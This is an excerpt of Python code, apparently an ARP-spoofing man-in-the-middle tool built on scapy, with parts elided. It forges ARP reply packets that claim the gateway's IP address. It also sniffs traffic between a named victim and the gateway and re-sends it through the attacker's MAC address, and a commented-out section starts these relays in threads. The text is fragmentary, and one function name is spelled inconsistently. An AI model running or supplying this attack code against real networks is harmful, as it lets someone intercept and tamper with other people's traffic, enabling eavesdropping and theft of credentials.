...
def GetMAC_byIP(victim_ip):
    return scapy.getmacbyip(victim_ip)
 
print(GetMAC_byIP(GW_IP_FINDER()))
...
def ArpReplyGen(gw_ip ,attack_mac , victim_mac , victim_ip):
    ...
    arp_packet[ARP].psrc = gw_ip      ### set src ip to gateway ip
    arp_packet[ARP].op = 2     ### set the type to 2 - response packet
    return arp_packet


def GW_TO_Victim_handler(packet,default_gateway_mac,gw_ip ,attack_mac , victim_mac , victim_ip):
    packet[Ether].dst = victim_mac
    packet[Ether].src = attack_mac
    sendp(packet)

def gateway2victim(default_gateway_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    sniff(filter = f"dst host {victim_ip} and src host {gw_ip}",prn=lambda packet: \
        GW_TO_Victim_handler(packet, default_gateway_mac, gw_ip ,attack_mac , victim_mac , victim_ip),timeout=seconds_to_run)

# def victim2gateway_handler(packet,default_gateway_mac,gw_ip ,attack_mac , victim_mac , victim_ip):
#     packet[Ether].dst = default_gateway_mac
#     packet[Ether].src = attack_mac
#     sendp(packet)

# def victim2gateway(default_gateway_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
#     sniff(filter = f"src host {victim_ip} and dst host {gw_ip}", prn=lambda packet: victim2gateway_handler(packet, default_gateway_mac, gw_ip ,attack_mac , victim_mac , victim_ip), timeout=seconds_to_run)
...
#     ### find mac of victim ###
#     victim_mac = GetMAC_ByIP(victim_ip)
#     ### find mac of default gateway ###
#     default_gateway_mac = GetMAC_ByIP(gw_ip)
...
#     arp_response_packet_gateway = ArpReplyGen(victim_ip,attack_mac,default_gateway_mac,gw_ip)
...
#     t1 = threading.Thread(target=gateway2victim, args=(default_gateway_mac,gw_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))
#     t2 = threading.Thread(target=victim2gateway, args=(default_gateway_mac,gw_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))
